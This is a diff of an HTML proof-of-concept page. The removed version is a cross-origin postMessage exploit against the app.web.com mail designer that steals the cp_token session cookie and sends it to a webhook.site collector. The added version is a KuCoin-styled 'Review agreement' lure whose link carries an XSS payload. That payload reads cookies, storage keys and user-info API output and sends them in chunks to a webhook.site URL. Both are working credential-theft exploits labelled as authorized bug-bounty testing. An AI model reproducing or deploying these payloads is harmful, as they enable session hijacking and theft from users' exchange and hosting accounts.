@@ -1,87 +1,26 @@
 <!doctype html>
+<html lang="en">
+<head>
 <meta charset="utf-8">
-<title>Security PoC - mail-designer message bus (authorized testing)</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>KuCoin Auto-Conversion Agreement</title>
 <style>
- body{font:15px/1.6 system-ui,-apple-system,Segoe UI,Roboto,sans-serif;margin:0;background:#f6f7f9;color:#1f2937}
- .wrap{max-width:720px;margin:6vh auto;background:#fff;padding:2.5rem;border-radius:12px;box-shadow:0 2px 16px rgba(0,0,0,.08)}
- h1{margin:0 0 .3rem;font-size:1.4rem}
- .warn{background:#fef3c7;border-left:4px solid #f59e0b;padding:.9rem 1rem;border-radius:6px;margin:1.2rem 0;font-size:14px}
- button{font:600 16px system-ui;padding:.8rem 1.6rem;border:0;border-radius:8px;background:#dc2626;color:#fff;cursor:pointer}
- button:hover{background:#b91c1c}
- pre{margin-top:1.4rem;background:#0f172a;color:#cbd5e1;padding:1rem;border-radius:8px;font-size:12px;white-space:pre-wrap;word-break:break-all;max-height:45vh;overflow:auto}
- code{background:#f1f5f9;padding:.1rem .3rem;border-radius:3px}
+ body{font:16px/1.6 -apple-system,system-ui,sans-serif;margin:0;background:#0b0e11;color:#eaecef}
+ .wrap{max-width:620px;margin:0 auto;padding:60px 24px;text-align:center}
+ h1{font-size:26px;margin:0 0 14px}
+ p{color:#b7bdc6;margin:0 0 28px}
+ a.cta{display:inline-block;background:#01bc8d;color:#06111c;font-weight:700;
+   font-size:17px;padding:15px 34px;border-radius:8px;text-decoration:none}
+ small{display:block;margin-top:40px;color:#5e6673;font-size:12px}
 </style>
+</head>
+<body>
 <div class="wrap">
-  <h1>Proof of concept: mail-designer message bus accepts cross-origin messages</h1>
-  <p>Authorized security testing against a Bugcrowd program. This page demonstrates that
-     <code>app.web.com</code>'s mail designer dispatches <code>window.message</code> events without
-     checking <code>event.origin</code>.</p>
-
-  <div class="warn">
-    <b>What happens when you press the button.</b> This page opens the Web.com mail designer in a
-    popup and posts one message to it. If you are signed in to app.web.com, that message becomes
-    executing HTML in the <code>app.web.com</code> origin, reads your <code>document.cookie</code>
-    including the <code>cp_token</code> session cookie, and sends it to the collector URL shown
-    below. Only press it with a test account you own.
-  </div>
-
-  <button id="go">Run the proof of concept</button>
-  <pre id="out">ready</pre>
+  <h1>Review your Auto-Conversion Agreement</h1>
+  <p>Your account has a pending auto-conversion agreement awaiting review.
+     Open it to confirm the terms.</p>
+  <a class="cta" href="https://www.kucoin.com/express/agreements/auto-conversion?displayParams=%7B%22currency%22%3A%22%3Ca%20href%3Djavascript%3Aname%3E%3Cspan%20class%3D%5C%22fixed%20inset-0%20z-50%20block%5C%22%3ECLICK%3C%2Fspan%3E%3C%2Fa%3E%22%7D" target="&lt;img src=x onerror=&quot;(async()=&gt;{const g=async u=&gt;{try{const r=await fetch(u,{credentials:&#x27;include&#x27;});return{u:u,s:r.status,b:(await r.text()).slice(0,2500)}}catch(e){return{u:u,e:String(e)}}};const out={m:&#x27;M125-XSS&#x27;,o:location.origin,h:location.href.slice(0,120),ck:document.cookie,lsk:Object.keys(localStorage),ssk:Object.keys(sessionStorage),api:[await g(&#x27;/_api/ucenter/user-info&#x27;)]};const s=JSON.stringify(out),N=1000,n=Math.ceil(s.length/N);for(let i=0;i&lt;n;i++){new Image().src=&#x27;https://webhook.site/7c5457a8-8c6f-474d-ba71-10560e051959?i=&#x27;+i+&#x27;&amp;n=&#x27;+n+&#x27;&amp;d=&#x27;+encodeURIComponent(s.slice(i*N,(i+1)*N));}document.title=&#x27;M125-EXFIL-SENT-&#x27;+n;document.body.innerHTML=&#x27;&lt;h1 style=font-size:30px&gt;XSS executed on &#x27;+location.origin+&#x27;&lt;br&gt;&#x27;+n+&#x27; chunks sent&lt;/h1&gt;&#x27;;})()&quot;&gt;">Review agreement</a>
+  <small>PoC - authorized security testing</small>
 </div>
-<script>
-const OOB = 'https://webhook.site/823fddaf-2aad-4f9f-9f81-a9757e4e331b';
-
-const out = document.getElementById('out');
-const say = s => { out.textContent += '\n' + s; out.scrollTop = out.scrollHeight; };
-out.textContent = 'attacker origin = ' + location.origin + '\ncollector       = ' + OOB;
-
-// a siteId that belongs to nobody: nothing about the victim has to be known
-const VICTIM_URL = 'https://app.web.com/mail-designer/999999999/email/start-from-scratch'
-                 + '?name=PoC&uuid=' + crypto.randomUUID();
-
-// rendered as live HTML inside the campaign, so this executes in the app.web.com origin
-const PAYLOAD =
-  'POC<img src=x onerror="' +
-    "var c=document.cookie;" +
-    "var m=/cp_token=([^;]+)/.exec(c);" +
-    "var u='" + OOB + "?cp='+encodeURIComponent(m?m[1]:'NONE')+'&origin='+encodeURIComponent(location.origin);" +
-    "fetch(u,{method:'POST',mode:'no-cors',body:c});" +
-    "if(window.opener){window.opener.postMessage({m725:1,cookie:c},'*');}" +
-  '">';
-
-const section = t => ({
-  id: 999725, layout:{section:{id:'text-4'}}, category:'text',
-  binding:{ title:t, description:'poc',
-            _toggle:{title:true,subtitle:false,description:true,button:false,image:false},
-            background:{colorIndex:3}, sectionPadding:'64',
-            contentAlignment:'left', fullPage:false }});
-
-let w=null, timer=null, tries=0, done=false;
-
-document.getElementById('go').onclick = () => {
-  if (w) return;
-  w = window.open(VICTIM_URL, 'poc', 'width=1400,height=900');
-  if (!w) { say('popup blocked: allow popups for this page and click again'); return; }
-  say('\nopened the designer, posting until the editor binds its listeners');
-  timer = setInterval(() => {
-    if (done || tries > 120) { clearInterval(timer); if(!done) say('gave up after '+tries+' posts'); return; }
-    tries++;
-    try { w.postMessage({type:'INSERT_NEW_SECTION',
-            data:{pageIndex:0,index:1,data:section(PAYLOAD)}}, '*'); } catch(e){}
-    if (tries % 10 === 0) say('  ' + tries + ' posts sent, still waiting');
-  }, 1000);
-};
-
-addEventListener('message', e => {
-  if (!e.data || !e.data.m725 || done) return;
-  done = true; clearInterval(timer);
-  const cp = /(?:^|;\s*)cp_token=([^;]+)/.exec(e.data.cookie);
-  say('');
-  say('EXECUTED IN ORIGIN : ' + e.origin);
-  say('posts needed       : ' + tries);
-  say('cookie bytes       : ' + e.data.cookie.length);
-  say('cp_token           : ' + (cp ? cp[1] : 'NOT FOUND'));
-  say('');
-  say('the same values were POSTed to the collector.');
-});
-</script>
+</body>
+</html>
